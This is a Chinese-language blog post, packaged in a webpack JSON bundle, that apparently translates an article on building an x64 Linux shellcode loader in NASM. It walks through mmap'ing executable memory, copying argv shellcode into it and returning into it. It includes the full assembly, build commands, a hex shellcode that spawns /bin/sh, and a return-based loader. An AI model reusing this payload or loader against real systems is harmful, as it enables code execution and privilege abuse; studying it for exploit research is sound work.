webpackJsonp([46,192],{576:function(n,e){n.exports={rawContent:'\n\n意译：[Shellcode/Loaders](http://blackhat.life/Shellcode_Loaders)\n\nshellcode Loader被用在缓冲区溢出或者其它形式的二进制挖掘活动中测试shellcode。最好的方法嘛，构建从命令行参数的用户友好的loader，并且传递给刚分配的可执行内存空间。本文在x86指令集写x64汇编来在linux上构建这么个载入器。\n\n32位的在文末给出\n\n[TOC]\n\n## 可执行loader\n\n### 命令行参数\n\n命令行参数入栈的顺序是：第二个参数，第一个参数，参数数目。因此，为了从参数获得shellcode，`pop rbx`三次。一旦完成，`rbx`将包含指向shellcode的指针：\n\n    BITS 64\n    global _start\n    _start:\n        pop rbx ;argc\n        pop rbx ; 参数列表指针\n        pop rbx ; 指向第一个参数的指针\n\n### 通过mmap()分配可执行内存区域\n\n参考x64 syscall table，自己谷歌就好。\n\n现代操作系统的栈默认并不可执行，但我们成功执行代码需要一个可执行栈。这可以通过mmap系统调用实现。\n\n`mmap()`的原型是(`man mmap`)：\n\n     void *mmap(void *addr, size_t length, int prot, int flags,\n                      int fd, off_t offset);\n\n在64位处理器上，函数调用如下：\n\n    function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)\n                  ^system          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6\n                   call #\n\n首先，`mmap()`的系统调用数(syscall number)放入`rax`：\n\n    push 0x9\n    pop rax\n\n`mmap()`的第一个参数需要是`null`，所以`xor rdi rdi`。\n\n    xor rdi, rdi\n\n指定缓冲区大小(4096字节或者0x1000字节) ，这个参数传给`rsi`\n\n    push rdi\n    pop rsi ; rsi = 0\n    inc rsi ; rsi = 1\n    shl rsi, 0xc  ; rsi=0x1000\n\n第三个参数`prot`保存在`rdx`中，是内核权限标志(读、写、执行或无)，对多个标志，它们用按位或方式合在一起，`PROT_READ|PROT_WRITE|PROT_EXEC`是数字`7`,所以直接在`rdx`中放入7就行。\n\n    push 0x7\n    pop rdx\n\n接下来的参数`flag`跟`prot`类似，保存了内存映射标志。本例中设置为`MAP_PRIVATE|MAP_ANONYMOUS`，其值为数字`0x22`。存储在`r10`中。\n\n    push 0x22\n    pop r10\n\n最后两个参数应该为`null`，放到`r8`和`r9`中\n\n    push rdi\n    push rdi\n    pop r8\n    pop r9\n\n万事具备，进行系统调用。\n\n    syscall\n\n接下来`rax`中就包含指向缓冲区的指针，这个指针可以用来把shellcode拷贝进去。\n\n### 拷贝代码到新内存区域\n\n把`rsi`作为计数器，初始化为0：\n\n    inject：\n        xor rsi, rsi\n\n把`rdi`设为`null`，等下要把当前字节和`dil`(rdi低8位)中的值比较来确定shellcode的结束位置。\n\n    push rsi\n    pop rdi\n\n如果拷贝到达shellcode末尾，则跳到`inject_finished`：\n\n    inject_loop:\n        cmp [rbx + rsi * 1], dil\n        je inject_finished\n\n每个字节从`[rbx + rsi]`移动到`[rax + rsi]`，通过`r10b`(`r10`低八位)。\n\n    mov r10b, [rbx+rsi*1]\n    mov [rax+rsi*1], r10b\n\n`rsi`作为偏移量和计数器：\n\n    inc rsi\n\n继续循环\n\n    jmp inject_loop:\n\n在`inject_finished`程序出附上`ret`操作符(opcode)`0xc3`\n\n    inject_finished:\n        mov byte [rax+rsi*1], 0xc3\n\n一般，操作符(opcode)指指令而字节码(bytecode)不仅包含操作符还包含参数，成为操作数(operand)。\n\n### 返回代码\n\n代码返回而不是跳转或被调用的原因在于，这更充分模拟了类似有漏洞应用在缓冲区溢出时的环境。有效载荷会返回，因此，当shellcode被加载后，它应该返回。\n\n首先调用`ret_to_shellcode`。这会把`exit`的地址推入栈顶，于是shellcode结束后返回`exit`的地址。\n\n    call ret_to_shellcode\n\n原始的返回地址被覆盖为为shellcode的地址，并且进入(returned into)\n\n    ret_to_shellcode:\n        push rax\n        ret\n\n当shellcode结束时，将返回到`exit`函数优雅的退出\n\n    exit：\n        push 60\n        pop rax\n        xor rdi, rdi\n        syscall\n\n### 执行loader\n\n编译链接吧\n\n     ~/Work/project/blackhat/shellcode  nasm -felf64 loader64.s -o loader64.o\n     ~/Work/project/blackhat/shellcode  ld loader64.o -o loader64\n     ~/Work/project/blackhat/shellcode  ./loader64 $(echo -en "\\x48\\x31\\xff\\x6a\\x69\\x58\\x0f\\x05\\x57\\x57\\x5e\\x5a\\x48\\xbf\\x6a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x0f\\x05")\n    [reverland@gentoo shellcode]$\n\n这个shellcode来自之前启动一个shell的shellcode，注意提示符。\n\n## 基于返回的载入器\n\n基于返回的代码也能用载入器测试，而且更小，不需要分配内存。\n\n    _start:\n        pop rbx\n        pop rbx\n        pop rsp ; rsp现在指向第一个参数\n        ret\n\n只是我觉得，似乎参数位置是不可执行的。关于ROP，以后说吧\n\n最后还有些动态载入和动态socket载入器。当shellcode依赖有漏洞二进制程序上下文时包含一个链接的动态部分，这是啥我现在还不知道。。。。。。\n\n下一篇[Dynamic shellcode](http://blackhat.life/Shellcode/Dynamic)\n\n\n\n\n',metaData:{layout:"post",title:"Shellcode/Loaders",excerpt:"嗯，谢谢loader",category:"exploit",tags:["shellcode"],disqus:!0}}}});